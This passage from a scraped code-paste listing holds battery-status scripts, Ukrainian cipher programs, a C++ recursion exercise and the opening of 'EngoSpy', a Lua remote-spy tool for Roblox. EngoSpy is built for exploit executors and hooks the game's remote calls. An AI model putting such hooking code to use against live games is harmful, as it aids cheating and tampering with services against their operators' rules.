puts ""Charge Remaining:              #{battery[:EstimatedChargeRemaining]}%\n""
puts '-' * 50

"
D7f2pNFU,batstats.js,Python253,JavaScript,Monday 6th of May 2024 01:39:23 PM CDT,"// -*- coding: utf-8 -*-
// Filename: batstats.js
// Version: 1.0.0
// Author: Jeoi Reqi

// This script retrieves battery information.
// The script presents battery details like status and charge level clearly.
// Users can quickly gauge battery health and make informed decisions about power usage.

// Example Output:
//    --------------------------------------------------
//    :: BATTERY STATS ::
//    --------------------------------------------------
//
//    Internal Battery: [AP18E8M]    Status: OK
//    Battery Status:                Connected to AC (2)
//    Charge Remaining:              95%
//
//    --------------------------------------------------
console.log(""-"".repeat(50));
console.log(""\t\t:: BATTERY STATS ::"");
console.log(""-"".repeat(50));

const batteryStatus = {
    1: 'Discharging',
    2: 'Connected to AC',
    3: 'Fully charged',
    4: 'Low',
    5: 'Critical',
    6: 'Charging',
    7: 'Charging/High',
    8: 'Charging/Low',
    9: 'Charging/Critical',
    10: 'Undefined',
    11: 'Partially Charged'
};

// Assuming battery information is obtained from an API call
const battery = {
    Caption: 'Internal Battery',
    Name: 'AP18E8M',
    Status: 'OK',
    BatteryStatus: 2,
    EstimatedChargeRemaining: 95
};

const batteryStatusDescription = batteryStatus[battery.BatteryStatus] || 'Unknown';

// Print battery information header
console.log("""");
console.log(`${battery.Caption}: [${battery.Name}]    Status: ${battery.Status}`);
console.log(`Battery Status:                ${batteryStatusDescription} (${battery.BatteryStatus})`);
console.log(`Charge Remaining:              ${battery.EstimatedChargeRemaining}%\n`);
console.log(""-"".repeat(50));
"
hq1Zj91K,verticalPermutationCipher,Oleksandr_Bitkov,Python,Monday 6th of May 2024 01:30:12 PM CDT,"def encode(msg, key, gap=""+""):

    unique_letters = []

    for letter in key:
        if letter not in unique_letters:
            unique_letters.append(letter)

    unique_letters.sort()

    letter_count = {}

    for letter in key:
        if letter in letter_count:
            letter_count[letter] += 1
        else:
            letter_count[letter] = 1

    length = len(unique_letters)
    temp_key = key
    index = 0
    counter = 1
    counter_index = 1
    order = []

    for _ in range(len(key)):
        order.append(0)

    while length != 0:
        for char in temp_key:
            if char == unique_letters[index]:
                index_char = temp_key.index(char)
                order[index_char] = counter
                counter += 1
                temp_key = temp_key[:index_char] + ""$"" + temp_key[index_char + 1 :]
                if letter_count[char] > counter_index:
                    counter_index += 1
                else:
                    counter_index = 1
                    index += 1
                    break
        length -= 1

    matrix = []

    while len(msg) % len(key) != 0:
        msg += gap

    matrix = [list(msg[i : i + len(key)]) for i in range(0, len(msg), len(key))]

    counter = 1
    length = len(key)

    new_matrix = []

    while length != 0:
        for item in order:
            if item == counter:
                index = order.index(item)
                colum = [row[index] for row in matrix]
                new_matrix.append(colum)
                counter += 1
                break

        length -= 1

    joined_rows = ["""".join(row) for row in new_matrix]

    result = """".join(joined_rows)

    result = result.replace(gap, """")

    return result


def decode(enc_msg, key):

    unique_letters = []

    for letter in key:
        if letter not in unique_letters:
            unique_letters.append(letter)

    unique_letters.sort()

    letter_count = {}

    for letter in key:
        if letter in letter_count:
            letter_count[letter] += 1
        else:
            letter_count[letter] = 1

    length = len(unique_letters)
    temp_key = key
    index = 0
    counter = 1
    counter_index = 1
    order = []

    for _ in range(len(key)):
        order.append(0)

    while length != 0:
        for char in temp_key:
            if char == unique_letters[index]:
                index_char = temp_key.index(char)
                order[index_char] = counter
                counter += 1
                temp_key = temp_key[:index_char] + ""$"" + temp_key[index_char + 1 :]
                if letter_count[char] > counter_index:
                    counter_index += 1
                else:
                    counter_index = 1
                    index += 1
                    break
        length -= 1

    del length, temp_key, index, counter, counter_index

    key_len = len(key)
    enc_msg_len = len(enc_msg)
    length = len(order)
    cur_pos_in_matrix = 1
    tmp_enc_msg = enc_msg
    prt_enc_msg = """"

    ful_col = enc_msg_len % key_len
    ful_row = (enc_msg_len // key_len) + 1

    if ful_col != 0:
        ful_col -= 1

    matrix = [["""" for _ in range(key_len)] for _ in range(ful_row)]

    while length != 0:
        for item in order:
            if item == cur_pos_in_matrix:
                cur_indx = order.index(item)
                if ful_col == 0:
                    ful_row = enc_msg_len // key_len
                    prt_enc_msg = tmp_enc_msg[:ful_row]
                    tmp_enc_msg = tmp_enc_msg[ful_row:]
                elif cur_indx <= ful_col:
                    ful_row = (enc_msg_len // key_len) + 1
                    prt_enc_msg = tmp_enc_msg[:ful_row]
                    tmp_enc_msg = tmp_enc_msg[ful_row:]
                else:
                    ful_row = enc_msg_len // key_len
                    prt_enc_msg = tmp_enc_msg[:ful_row]
                    tmp_enc_msg = tmp_enc_msg[ful_row:]

                lst_prt_enc_msg = list(prt_enc_msg)

                for i in range(len(lst_prt_enc_msg)):
                    matrix[i][cur_indx] = lst_prt_enc_msg[i]

                cur_pos_in_matrix += 1
                break
            else:
                continue
        length -= 1

    msg = """".join(sum(matrix, []))

    return msg
"
4c3tpyA0,substitutionCipher,Oleksandr_Bitkov,Python,Monday 6th of May 2024 01:29:20 PM CDT,"def encode(msg, key, alpha):

    if alpha == ""ukr"":
        alphabet = [
            ""а"",
            ""б"",
            ""в"",
            ""г"",
            ""ґ"",
            ""д"",
            ""е"",
            ""є"",
            ""ж"",
            ""з"",
            ""и"",
            ""і"",
            ""ї"",
            ""й"",
            ""к"",
            ""л"",
            ""м"",
            ""н"",
            ""о"",
            ""п"",
            ""р"",
            ""с"",
            ""т"",
            ""у"",
            ""ф"",
            ""х"",
            ""ц"",
            ""ч"",
            ""ш"",
            ""щ"",
            ""ь"",
            ""ю"",
            ""я"",
        ]
    elif alpha == ""en"":
        alphabet = [
            ""a"",
            ""b"",
            ""c"",
            ""d"",
            ""e"",
            ""f"",
            ""g"",
            ""h"",
            ""i"",
            ""j"",
            ""k"",
            ""l"",
            ""m"",
            ""n"",
            ""o"",
            ""p"",
            ""q"",
            ""r"",
            ""s"",
            ""t"",
            ""u"",
            ""v"",
            ""w"",
            ""x"",
            ""y"",
            ""z"",
        ]
    else:
        raise TypeError(""Не зрозуміла абетка"")

    padded_key = key.ljust(9)
    my_list = [[0, 0, 9, 8, 7, 6, 5, 4, 3, 2, 1], [0] + list(padded_key) + [""""]]

    encrypt_msg = """"

    counter = 1
    new_sublist = [counter]

    for letter in alphabet:
        if letter not in padded_key:
            new_sublist.append(letter)
            if len(new_sublist) - 1 == 10:
                my_list.append(new_sublist)
                counter += 1
                new_sublist = [counter]

    if len(new_sublist) > 1:
        my_list.append(new_sublist)

    counter = 2
    for charset in msg:
        if charset in my_list[1]:
            my_index = my_list[1].index(charset)
            encrypt_msg += str(my_list[0][my_index])
            continue
        for sublist_index in range(2, len(my_list)):
            if charset in my_list[sublist_index]:
                my_index = my_list[sublist_index].index(charset)
                encrypt_msg += f""{sublist_index - 1}{my_list[0][my_index]}""

    return encrypt_msg


def decode(encrypt_msg, key, alpha):

    if alpha == ""ukr"":
        alphabet = [
            ""а"",
            ""б"",
            ""в"",
            ""г"",
            ""ґ"",
            ""д"",
            ""е"",
            ""є"",
            ""ж"",
            ""з"",
            ""и"",
            ""і"",
            ""ї"",
            ""й"",
            ""к"",
            ""л"",
            ""м"",
            ""н"",
            ""о"",
            ""п"",
            ""р"",
            ""с"",
            ""т"",
            ""у"",
            ""ф"",
            ""х"",
            ""ц"",
            ""ч"",
            ""ш"",
            ""щ"",
            ""ь"",
            ""ю"",
            ""я"",
        ]
    elif alpha == ""en"":
        alphabet = [
            ""a"",
            ""b"",
            ""c"",
            ""d"",
            ""e"",
            ""f"",
            ""g"",
            ""h"",
            ""i"",
            ""j"",
            ""k"",
            ""l"",
            ""m"",
            ""n"",
            ""o"",
            ""p"",
            ""q"",
            ""r"",
            ""s"",
            ""t"",
            ""u"",
            ""v"",
            ""w"",
            ""x"",
            ""y"",
            ""z"",
        ]
    else:
        raise TypeError(""Не зрозуміла абетка"")

    decrypt_msg = """"

    padded_key = key.ljust(9)
    my_list = [[0, 0, 9, 8, 7, 6, 5, 4, 3, 2, 1], [0] + list(padded_key) + [""""]]

    counter = 1
    new_sublist = [counter]

    for letter in alphabet:
        if letter not in padded_key:
            new_sublist.append(letter)
            if len(new_sublist) - 1 == 10:
                my_list.append(new_sublist)
                counter += 1
                new_sublist = [counter]

    if len(new_sublist) > 1:
        my_list.append(new_sublist)

    def find_char(str, my_list):
        my_index = my_list[0].index(int(str[1]))
        if my_index == 0:
            my_index += 1
        if 0 < int(str[0]) + 1 < len(my_list) and 0 < my_index < len(my_list[0]):
            return my_list[int(str[0]) + 1][my_index]

    temp_char = """"
    check = False
    inside_conter = 0
    double_char = []

    for row in my_list[1:]:
        value = row[0]
        if int(value) != 0:
            double_char.append(value)

    # print(f""\n{encrypt_msg}\n"")

    for char in encrypt_msg:
        if (int(char) in double_char) or check:
            temp_char += char
            inside_conter += 1
            if inside_conter == 2:
                check = False
                inside_conter = 0
                decrypt_msg += find_char(temp_char, my_list)
                temp_char = """"
            else:
                check = True
        else:
            index = my_list[0].index(int(char))
            if index == 0:
                index += 1
            decrypt_msg += my_list[1][index]

    return decrypt_msg
"
uc7jbCGW,menu,Oleksandr_Bitkov,Python,Monday 6th of May 2024 01:28:17 PM CDT,"import verticalPermutationCipher as vpc
import substitutionCipher as sc

import os

exit = False


while True:
    os.system(""cls"" if os.name == ""nt"" else ""clear"")
    print(
        ""\n==================================:Шифрування/Розшифрування:==================================""
    )
    print(
        ""----Використовується \033[1;32;34mпоєднаний шифр\033[0m та \033[1;32;34mшифр вертикальної перестановки\033[0m------------""
    )
    print(""\n\nОберіть дію:\n"")
    print(""1. Шифрування повідомлення;"")
    print(""2. Розшифрування повідомлення;"")
    print(""0. Вихід з застосунку."")

    do = input(""\n\nОберіть дію: "")

    if do == ""1"":
        os.system(""cls"" if os.name == ""nt"" else ""clear"")
        while True:
            print(""\n=========:ШИФРУВАННЯ:========="")
            print(""\n\nЗа яким алгоритмом будемо виконувати шифрування?\n"")
            print(""1. Шифр вертикальної перестановки;"")
            print(""2. Поєднаний шифр;"")
            print(""9. Повернутися назад;"")
            print(""0. Вихід із застосунку."")

            choice = input(""\n\nОбраний алгоритм/дія: "")

            if choice == ""1"":
                os.system(""cls"" if os.name == ""nt"" else ""clear"")
                print(""\n=========:Шифр вертикальної перестановки:========="")
                key = input(""\nУвідть ключ: "")
                message = input(""Увідть повідомлення: "")

                print(""\nВаше зашфироване повідомлення можно скопіювати нижче\n\n"")
                print(vpc.encode(message, key))

                input(""\n\nНатисніть будь-яку клавішу для продовження..."")
                os.system(""cls"" if os.name == ""nt"" else ""clear"")

            elif choice == ""2"":
                os.system(""cls"" if os.name == ""nt"" else ""clear"")
                print(""\n=========:Поєднаний шифр:========="")
                while True:
                    print(""\nДля початку оберіть абетку\n"")
                    print(""1. Українська;"")
                    print(""2. Англійська;"")
                    choice = input(""\n\nОберіть абетку: "")

                    if choice == ""1"":
                        alpabet = ""ukr""
                        break
                    elif choice == ""2"":
                        alpabet = ""en""
                        break
                    else:
                        print(""\033[31mНе зрозумілий вибір! Оберіть з переліку\033[0m"")
                        input(""\n\nНатисніть будь-яку клавішу для продовження..."")
                        os.system(""cls"" if os.name == ""nt"" else ""clear"")

                key = input(""\nУвідть ключ: "")
                message = input(""Увідть повідомлення: "")

                print(""\nВаше зашфироване повідомлення можно скопіювати нижче\n\n"")
                print(sc.encode(message, key, alpabet))

                input(""\n\nНатисніть будь-яку клавішу для продовження..."")
                os.system(""cls"" if os.name == ""nt"" else ""clear"")

            elif choice == ""9"":
                os.system(""cls"" if os.name == ""nt"" else ""clear"")
                break
            elif choice == ""0"":
                os.system(""cls"" if os.name == ""nt"" else ""clear"")
                exit = True
                break
            else:
                print(""\n\033[31mНе зрозумілий вибір. Оберіть з переліку\033[0m"")
                input(""\nНатисніть будь-яку клавішу для продовження..."")
                os.system(""cls"" if os.name == ""nt"" else ""clear"")

    elif do == ""2"":
        os.system(""cls"" if os.name == ""nt"" else ""clear"")
        while True:
            print(""\n=========:РОЗШИФРУВАННЯ:========="")
            print(""\n\nЗа яким алгоритмом будемо виконувати розшифрування?\n"")
            print(""1. Шифр вертикальної перестановки;"")
            print(""2. Поєднаний шифр;"")
            print(""9. Повернутися назад;"")
            print(""0. Вихід із застосунку."")

            choice = input(""\n\nОбраний алгоритм: "")

            if choice == ""1"":
                os.system(""cls"" if os.name == ""nt"" else ""clear"")
                print(""\n=========:Шифр вертикальної перестановки:========="")
                key = input(""\nУвідть ключ: "")
                message = input(""Увідть зашифроване повідомлення: "")

                print(""\nВаше розшифроване повідомлення можна скопіювати нижче\n\n"")
                print(vpc.decode(message, key))

                input(""\n\nНатисніть будь-яку клавішу для продовження..."")
                os.system(""cls"" if os.name == ""nt"" else ""clear"")

            elif choice == ""2"":
                os.system(""cls"" if os.name == ""nt"" else ""clear"")
                print(""\n=========:Поєднаний шифр:========="")
                while True:
                    print(""\nДля початку оберіть абетку\n"")
                    print(""1. Українська;"")
                    print(""2. Англійська;"")
                    choice = input(""\n\nОберіть абетку: "")

                    if choice == ""1"":
                        alpabet = ""ukr""
                        break
                    elif choice == ""2"":
                        alpabet = ""en""
                        break
                    else:
                        print(""\033[31mНе зрозумілий вибір! Оберіть з переліку\033[0m"")
                        input(""\n\nНатисніть будь-яку клавішу для продовження..."")
                        os.system(""cls"" if os.name == ""nt"" else ""clear"")

                key = input(""\nУвідть ключ: "")
                message = input(""Увідть зашифроване повідомлення: "")

                print(""\nВаше розшифроване повідомлення можна скопіювати нижче\n\n"")
                print(sc.decode(message, key, alpabet))

                input(""\n\nНатисніть будь-яку клавішу для продовження..."")
                os.system(""cls"" if os.name == ""nt"" else ""clear"")

            elif choice == ""9"":
                os.system(""cls"" if os.name == ""nt"" else ""clear"")
                break
            elif choice == ""0"":
                os.system(""cls"" if os.name == ""nt"" else ""clear"")
                exit = True
                break
            else:
                print(""\n\033[31mНе зрозумілий вибір. Оберіть з переліку\033[0m"")
                input(""\nНатисніть будь-яку клавішу для продовження..."")
                os.system(""cls"" if os.name == ""nt"" else ""clear"")
    elif do == ""0"":
        os.system(""cls"" if os.name == ""nt"" else ""clear"")
        print(""\nДо зустрічі :)"")
        break
    else:
        print(""\n\033[31mНе зрозуміла дія. Оберіть з переліку!\033[0m"")
        input(""\nНатисніть будь-яку клавішу для продовження..."")
        os.system(""cls"" if os.name == ""nt"" else ""clear"")

    if exit:
        os.system(""cls"" if os.name == ""nt"" else ""clear"")
        print(""\nДо зустрічі :)"")
        break
"
Yt1WjEsc,batstats.py,Python253,Python,Monday 6th of May 2024 01:26:58 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: batstats.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
This script retrieves battery information using the wmi module.
It's designed for Windows, requiring Python 3.x and wmi.
The script presents battery details like status and charge level clearly.
Users can quickly gauge battery health and make informed decisions about power usage.

Requirements:
    - Python 3.x
    - wmi module

Usage:
    - Before running the script, ensure you have Python installed on your system.
    - Make sure the `wmi` module is installed. You can install it using pip:
            
            'pip install wmi'
        
    - Navigate to the directory containing this script in the terminal.
    - Run the script using the following command:
            
            'python batstats.py'

Example Output:

        --------------------------------------------------
                :: BATTERY STATS ::
        --------------------------------------------------

        Internal Battery: [AP18E8M]    Status: OK
        Battery Status:                Connected to AC (2)
        Charge Remaining:              95%

        --------------------------------------------------
""""""

import wmi

# Initialize WMI interface
c = wmi.WMI()

# Get battery information
battery = c.Win32_Battery()[0]

# Dictionary to map battery status codes to their descriptions
battery_status = {
    1: 'Discharging',
    2: 'Connected to AC',
    3: 'Fully charged',
    4: 'Low',
    5: 'Critical',
    6: 'Charging',
    7: 'Charging/High',
    8: 'Charging/Low',
    9: 'Charging/Critical',
    10: 'Undefined',
    11: 'Partially Charged'
}

# Get battery status description based on the status code
battery_status_description = battery_status.get(battery.BatteryStatus, 'Unknown')

# Print battery information header
print(""-"" * 50)
print(""\t\t:: BATTERY STATS ::"")
print(""-"" * 50)

# Print battery information
print(f""\n{battery.Caption}: [{battery.Name}]    Status: {battery.Status}"")
print(f""Battery Status:                {battery_status_description} ({battery.BatteryStatus})"")
print(f""Charge Remaining:              {battery.EstimatedChargeRemaining}%\n"")
print(""-"" * 50)
"
6nX6Nuax,batstats.ps1,Python253,PowerShell,Monday 6th of May 2024 01:26:18 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Filename: batstats.ps1
# Version: 1.0.0
# Author: Jeoi Reqi

# This script retrieves battery information using the wmi module.
# It's designed for Windows, requiring Python 3.x and wmi.
# The script presents battery details like status and charge level clearly.
# Users can quickly gauge battery health and make informed decisions about power usage.
#
# Before running the script, navigate to the directory where the script is located using the PowerShell terminal.
# Then, run the script using the following command: .\battery.ps1

# Get battery information
$b = Get-CimInstance Win32_Battery

# Define battery status descriptions
$batteryStatus = @{
    1 = 'Discharging'
    2 = 'Connected to AC'
    3 = 'Fully charged'
    4 = 'Low'
    5 = 'Critical'
    6 = 'Charging'
    7 = 'Charging/High'
    8 = 'Charging/Low'
    9 = 'Charging/Critical'
    10 = 'Undefined'
    11 = 'Partially Charged'
}[[int]$b.BatteryStatus]

# Print battery information header
Write-Output ""--------------------------------------------------""
Write-Output ""`t`t:: BATTERY STATS ::""
Write-Output ""--------------------------------------------------""

# Print battery information
Write-Output """"
Write-Output ""$($b.Caption): [$($b.Name)]    Status: $($b.Status)""
Write-Output ""Battery Status:                $batteryStatus ($($b.BatteryStatus))""
Write-Output ""Charge Remaining:              $($b.EstimatedChargeRemaining)%""
Write-Output """"
Write-Output ""--------------------------------------------------""

"
r0fAVvYw,рекурсия,Petro_zzz,C++,Monday 6th of May 2024 01:25:29 PM CDT,"#include <iostream>

using namespace std;

long long factor(int n) {
	cout << ""call "" << n << endl;
	if (n <= 1)
		return 1;
	return n * factor(n - 1);
}

long long factor2(int n) {
	long long res = 1;
	while (n > 1)
		res *= n--;
	return res;
}

void show(int size, int arr[]) {
	if (size == 0)
		return;
	cout << arr[0] << "" "";
	show(size - 1, arr+1);
}

void show2(int size, int arr[]) {
	if (size == 0)
		return;	
	show(size - 1, arr);
	cout << arr[size - 1] << "" "";
}

int get_pow(int x, int y) {
	if (y == 0)
		return 1;
	return x * get_pow(x, y - 1);
}

int fibo(int n) {
	if (n < 2)
		return 1;
	return fibo(n - 1) + fibo(n - 2);
}

int fibo2(int n) {
	if (n < 2)
		return 1;
	int f_pred = 1;
	int f_pred_pred = 1;
	int f = 1;

	for (int k = 1; k < n; k++) {
		f = f_pred + f_pred_pred;
		f_pred_pred = f_pred;
		f_pred = f;
	}
	return f;
}


void test_recursion() {
	cout << ""5! = "" << factor(5) << endl;
	cout << ""5! = "" << factor2(5) << endl;

	const int size = 5;
	int arr[size]{ 501, 502, 503, 504, 505 };
	show(size, arr);
	cout << endl;
	show2(size, arr);
	cout << endl;

	cout << get_pow(3, 4) << endl;
	//3*3*3*3 = 9 * 9 = 81
	
	for (int n = 1; n < 20; n++) {
		cout << (double)fibo(n) / fibo(n-1) << "" "";
	}
	cout << endl;

	for (int n = 0; n < 20; n++) {
		cout << fibo2(n) << "" "";
	}
	cout << endl;
}

int main() {
	test_recursion();
	return 0;
}"
SCqZXNvu,EngoSpy,Marty2000,Lua,Monday 6th of May 2024 01:19:49 PM CDT,"local wasLoaded = true; if not game.IsLoaded(game) then wasLoaded = false; repeat task.wait() until game.IsLoaded(game) end
local spy_settings = ({...})[1] or {}
local st = tick()
local service = setmetatable({}, {__index = function(t,k) return game.GetService(game,k) end})
local decompile = decompile or disassemble or function() return ""-- Decompiler not found."" end
local setclipboardfunc = function(message) if setclipboard then setclipboard(""-- This was generated from engospy RemoteSpy tool.\n""..tostring(message)) else print(""Couldn't setclipboard."") end end
local setident = syn and syn.set_thread_identity or setidentity or setthreadcontext
local isV3 = syn and syn.toast_notification ~= nil
local lplr = service.Players.LocalPlayer
local mouse = lplr:GetMouse()
local spy = {
    VERSION = ""v1.02"",
    Connections = {},
    guiConnections = {},
    instances = {},
    blocked = {},
    ignored = {},
    currentTableDepth = 0,
    saveCalls = spy_settings.saveCalls or false,
    saveOnlyLastCall = spy_settings.saveCalls and false or spy_settings.saveOnlyLastCall or true,
    maxTableDepth = spy_settings.maxTableDepth or 100,
    maxCallsSaved = spy_settings.maxCallsSaved or 1000,
    minimizeBind = spy_settings.minimizeBind or Enum.KeyCode.RightAlt,
    newFunctionMethod = spy_settings.newFunctionMethod or true,
    assets = {
        RemoteEvent = ""http://www.roblox.com/asset/?id=413369506"",
        RemoteFunction = ""http://www.roblox.com/asset/?id=413369623""
    },
    namecallmethods = {
        RemoteEvent = ""FireServer"",
        RemoteFunction = ""InvokeServer"",
        --BindableEvent = ""Fire"",
        --BindableFunction = ""Invoke"",
    },
    event = Instance.new(""BindableEvent""),
    blacklistedNames = spy_settings.blacklistedNames or {},
}
shared.engospy = spy
if getgenv then getgenv().engospy = spy end
local old_namecall = nil
local old_index = nil
local is_hooking = false

function spy.newInstance(self, classname, properties) 
    local instance = Instance.new(classname)
    for i,v in next, properties do 
        instance[i] = v
    end
    spy.instances[instance.Name] = instance
    return instance
end
spy.createInstance = spy.newInstance

function spy.Destroy(self) 
    for i,v in next, spy.instances do 
        v:Destroy()
        spy.Connections[i] = nil
    end
    for i,v in next, spy.guiConnections do 
        v:Disconnect()
        spy.guiConnections[i] = nil
    end
    spy.unhook()
    spy = nil
end

local function has_unicode(str) 
    local notAllowed = "":()[]{}+_-=\\|`~,.<>/?!@#$%^&*""

    for character in string.gmatch(str, ""([%z\1-\127\194-\244][\128-\191]*)"") do
        if notAllowed:find(character) then
            return true
        end
    end
end

local function to_unicode(string)
    local codepoints = ""utf8.char(""
    
    for _i, v in utf8.codes(string) do
        codepoints = codepoints .. v .. ', '
    end
    
    return codepoints:sub(1, -3) .. ')'
end

local function format_string(str)
    local str = str:gsub(""\0"", ""\\0""):gsub(""\n"", ""\\n""):gsub(""\r"", ""\\r""):gsub(""\t"", ""\\t""):gsub(""\v"", ""\\v""):gsub(""\b"", ""\\b""):gsub(""\f"", ""\\f"")

    return str
end

function spy.get_path(instance) -- // Thanks to turtlespy for this code, see https://pastebin.com/raw/BDhSQqUU \\
    local name = instance.Name
    local head = (#name > 0 and '.' .. name) or ""['']""
    if not instance.Parent and instance ~= game then
        return head .. "" --[[ Parented to nil ]]""
    end
    if instance == game then
        return ""game""
    elseif instance == workspace then
        return ""workspace""
    else
        local _success, result = pcall(game.GetService, game, instance.ClassName)
        
        if _success and result then
            head = ':GetService(""' .. instance.ClassName .. '"")'
        elseif instance == lplr then
            head = '.LocalPlayer' 
        else    
            local nonAlphaNum = name:gsub('[%w_]', '')
            local noPunct = nonAlphaNum:gsub('[%s%p]', '')
            
            if tonumber(name:sub(1, 1)) or (#nonAlphaNum ~= 0 and #noPunct == 0) then
                head = '[""' .. name:gsub('""', '\\""'):gsub('\\', '\\\\') .. '""]'
            elseif #nonAlphaNum ~= 0 and #noPunct > 0 then
                head = '[' .. to_unicode(name) .. ']'
            end
        end
    end
    return spy.get_path(instance.Parent) .. head
end

function spy.table_to_string(t) 
    spy.currentTableDepth = spy.currentTableDepth + 1
    if spy.currentTableDepth > spy.maxTableDepth+1 then
        spy.currentTableDepth = spy.currentTableDepth - 1
        return ""table_over_maxTableDepth (..""..tostring(t).."")""
    end
    local returnStr = ""{""
    for i,v in next, t do
        returnStr = returnStr..""\n""..((""    ""):rep(spy.currentTableDepth))..""[""..spy.get_real_value(i)..""] = ""..spy.get_real_value(v).."",""
    end
    if returnStr:sub(-2) == "", "" then returnStr = returnStr:sub(1, -3) end
    spy.currentTableDepth = spy.currentTableDepth - 1
    return returnStr..""\n""..((""    ""):rep(spy.currentTableDepth))..""}""
end

function spy.bettergetinfo(func) 
    local info = debug.getinfo(func)
    info.func = nil 
    return info
end

function spy.get_real_value(value)
    local _t = typeof(value)
    if _t == 'Instance' then
        return spy.get_path(value)
    elseif _t == 'string' then
        local value = format_string(value)
        return '""'..value..'""'
    elseif _t == 'table' then 
        return spy.table_to_string(value)
    elseif _t == 'function' then
        if not islclosure((value)) then 
            return ""newcclosure(function() end)""
        end
        if spy.newFunctionMethod then
            return ""--[[function -->]] ""..spy.table_to_string({upvalues = debug.getupvalues(value), constants = debug.getconstants(value), protos = debug.getprotos(value), info = spy.bettergetinfo(value)})
        end
        return ""function() end""
    elseif _t == 'UDim2' or _t == 'UDim' or _t == 'Vector3' or _t == 'Vector2' or _t == 'CFrame' or _t == 'Vector2int16' or _t == 'Vector3int16' or _t == 'BrickColor' or _t == 'Color3' then
        local value = _t == 'BrickColor' and ""'""..tostring(value)..""'"" or value
        return _t.."".new(""..tostring(value).."")""
    elseif _t == 'TweenInfo' then
        return ""TweenInfo.new(""..spy.get_real_value(value.Time).."", ""..spy.get_real_value(value.EasingStyle).."", ""..spy.get_real_value(value.EasingDirection).."", ""..spy.get_real_value(value.RepeatCount).."", ""..spy.get_real_value(value.Reverses).."", ""..spy.get_real_value(value.DelayTime).."")""
    elseif _t == 'Enums' then
        return ""Enum""
    elseif _t == 'Enum' then
        return ""Enum.""..tostring(value)
    elseif _t == 'Axes' or _t == 'Faces' then
        local returnStr = _t.."".new(""
        local normals = Enum.NormalId:GetEnumItems()
        for i,v in next, normals do
            if value[v.Name] then
                returnStr = returnStr..spy.get_real_value(v).."", ""
            end
        end
        return returnStr:sub(1, -3).."")""
    elseif _t == 'ColorSequence' then
        local returnStr = ""ColorSequence.new{""
        local keypoints = value.Keypoints
        for i,v in next, keypoints do 
            returnStr = returnStr..spy.get_real_value(v).."", ""
        end
        return returnStr:sub(1, -3)..""}""
    elseif _t == 'ColorSequenceKeypoint' then
        return ""ColorSequenceKeypoint.new(""..tostring(value.Time).."", ""..spy.get_real_value(value.Value).."")""
    elseif _t == 'DockWidgetPluginGuiInfo' then -- // this was a pain to make \\
        local str = """"
        local split1 = tostring(value):split("":"")
        for i,v in next, split1 do 
            str = str..v.."" ""
        end
        local split2 = str:split("" "") 
        local str = """"
        local reali = 0
        for i,v in next, split2 do
            if math.floor(i/2) == i/2 and v~="" "" then
                reali = reali + 1
                local _v = v
                if reali == 1 then 
                    _v = ""Enum.InitialDockState.""..v
                end
                str = str.._v.."", ""
            end
        end
        return ""DockWidgetPluginGuiInfo.new(""..(str:sub(1, -3)).."")""
    elseif _t == 'DateTime' then
		if value.UnixTimestampMillis == DateTime.now().UnixTimestampMillis then
            return ""DateTime.now()""
        end
        return ""DateTime.fromUnixTimestampMillis(""..value.UnixTimestampMillis.."")""
    elseif _t == 'FloatCurveKey' then
        return ""FloatCurveKey.new(""..spy.get_real_value(value.Time).."", ""..spy.get_real_value(value.Value).."", ""..spy.get_real_value(value.Interpolation).."")""
    elseif _t == 'NumberRange' then
        return ""NumberRange.new(""..spy.get_real_value(value.Min).."", ""..spy.get_real_value(value.Max).."")""
    elseif _t == 'NumberSequence' then
        local returnStr = ""NumberSequence.new{""
        local keypoints = value.Keypoints
        for i,v in next, keypoints do 
            returnStr = returnStr..spy.get_real_value(v).."", ""
        end
        return returnStr:sub(1, -3)..""}""
    elseif _t == 'NumberSequenceKeypoint' then
        return ""NumberSequenceKeypoint.new(""..tostring(value.Time).."", ""..spy.get_real_value(value.Value)..(value.Envelope and "", ""..value.Envelope or """").."")""
    elseif _t == 'PathWaypoint' then
        return ""PathWaypoint.new(""..spy.get_real_value(value.Position).."", ""..spy.get_real_value(value.Action).."")""
    elseif _t == 'PhysicalProperties' then
        return ""PhysicalProperties.new(""..spy.get_real_value(value.Density).."", ""..spy.get_real_value(value.Friction).."", ""..spy.get_real_value(value.Elasticity).."", ""..spy.get_real_value(value.FrictionWeight).."", ""..spy.get_real_value(value.ElasticityWeight).."")""
    elseif _t == 'Random' then
        return ""Random.new()""
    elseif _t == 'Ray' then
        return ""Ray.new(""..spy.get_real_value(value.Origin).."", ""..spy.get_real_value(value.Direction).."")""
    elseif _t == 'RaycastParams' then
        return ""--[[typeof: RaycastParams ->]] {FilterDescendantsInstances = ""..spy.get_real_value(value.FilterDescendantsInstances).."", FilterType = ""..spy.get_real_value(value.FilterType).."", IgnoreWater = ""..spy.get_real_value(value.IgnoreWater).."", CollisionGroup = '""..spy.get_real_value(value.CollisionGroup)..""'}""
    elseif _t == 'RaycastResult' then
        return ""--[[typeof: RaycastResult ->]] {Distance = "" ..spy.get_real_value(value.Distance).."", Instance = ""..spy.get_real_value(value.Instance).."", Material = ""..spy.get_real_value(value.Material).."", Position = ""..spy.get_real_value(value.Position).."", Normal = ""..spy.get_real_value(value.Normal)..""}""
    elseif _t == 'RBXScriptConnection' then
        return ""--[[typeof: RBXScriptConnection ->]] {Connected = ""..spy.get_real_value(value.Connected)..""}""
    elseif _t == 'RBXScriptSignal' then
        return ""RBXScriptSignal""
    elseif _t == 'Rect' then
        return ""Rect.new(""..spy.get_real_value(value.Min).."", ""..spy.get_real_value(value.Max).."")""
    elseif _t == 'Region3' then
        local cframe = value.CFrame
        local size = value.Size
        local min = spy.get_real_value((cframe * CFrame.new(-size.X/2, -size.Y/2, -size.Z/2)).p)
        local max = spy.get_real_value((cframe * CFrame.new(size.X/2, size.Y/2, size.Z/2)).p)
        return ""Region3.new(""..min.."", ""..max.."")""
    elseif _t == 'Region3int16' then
        return ""Region3int16.new(""..spy.get_real_value(value.Min).."", ""..spy.get_real_value(value.Max).."")""
    elseif _t == 'CatalogSearchParams' then
        return ""--[[typeof: CatalogSearchParams ->]] {SearchKeyword = ""..spy.get_real_value(value.SearchKeyword).."", MinPrice = ""..spy.get_real_value(value.MinPrice).."", MaxPrice = ""..spy.get_real_value(value.MaxPrice).."", SortType = ""..spy.get_real_value(value.SortType).."", CategoryFilter = ""..spy.get_real_value(value.CategoryFilter).."", AssetTypes = ""..spy.get_real_value(value.AssetTypes)..""}""
